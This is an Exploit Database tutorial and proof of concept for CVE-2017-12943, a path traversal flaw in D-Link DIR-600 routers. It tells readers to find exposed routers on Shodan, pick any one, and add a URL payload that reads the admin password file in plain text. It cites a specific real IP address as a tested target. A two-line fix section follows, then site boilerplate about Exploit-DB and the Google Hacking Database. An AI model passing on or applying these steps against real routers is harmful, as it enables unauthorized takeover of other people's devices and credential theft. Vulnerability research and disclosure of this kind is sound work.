# D-Link DIR-600 - Authentication Bypass (Absolute Path Traversal Attack)

Hello All,

In this tutorial i will explain How to get Username & Password of D-link router 600 - Directory Traversal Attack

Type: Webapps

Platform: Hardware

Choose any vulnerable (2.01,B1) router, browse www.shodan.io to explore all the Online devices
(Register and login an Shodan account in order to unlock the advanced search features)

Search for D-Link DIR-600 router

Choose any router you want  and proceed to the login page

The hack is so simple, it requires no additional tools other your browser and quick copy-n-paste.
Attacker is only required to do enter the following payload to get the user's creds : model/\_\_show\_info.php?REQUIRE\_FILE=/var/etc/httpasswd

eg: http://targetIP:8080/model/\_\_show\_info.php?REQUIRE\_FILE=/var/etc/httpasswd

if you set the traget device then you’re good to go.

Now you will see the login credential shown in plain text. Next, you may use the Login ID and Password to access the router.

if you need to exploit online, the target router must enable remote access.
The password file must listed/located in the correct path which is /var/etc/httpasswd

Fix & Countermesure:

Turn off the router remote access feature if you are not using.
Upgrade your router firmware.

For More Video POC & Exploit DB write up is below :)

# Exploit Title: D-Link DIR-600  - Authentication Bypass (Absolute Path Traversal Attack)
# CVE - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12943
# Date: 29-08-2017
# Exploit Author: Jithin D Kurup
# Contact : https://in.linkedin.com/in/jithin-d-kurup-77b616142
# Vendor : www.dlink.com
# Version: Hardware version: B1
# Firmware version: 2.01
# Tested on:All Platforms

1) Description

After Successfully Connected to D-Link DIR-600
Router(FirmWare Version : 2.01), Any User Can Easily Bypass The Router's
Admin Panel Just by adding a simple payload into URL.

D-Link DIR-600 Rev Bx devices with v2.x firmware allow remote attackers to
read passwords via a model/\_\_show\_info.php?REQUIRE\_FILE= absolute path traversal attack,
as demonstrated by discovering the admin password.

Its More Dangerous when your Router has a public IP with remote login
enabled.

IN MY CASE,
Tested Router IP : http://190.164.170.249

Video POC : https://www.youtube.com/watch?v=PeNOJORAQsQ

2) Proof of Concept

Step 1: Go to
Router Login Page : http://190.164.170.249:8080

Step 2:
Add the payload to URL.

Payload: model/\_\_show\_info.php?REQUIRE\_FILE=%2Fvar%2Fetc%2Fhttpasswd

Bingooo You got admin Access on router.
Now you can download/upload settings , Change settings etc.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
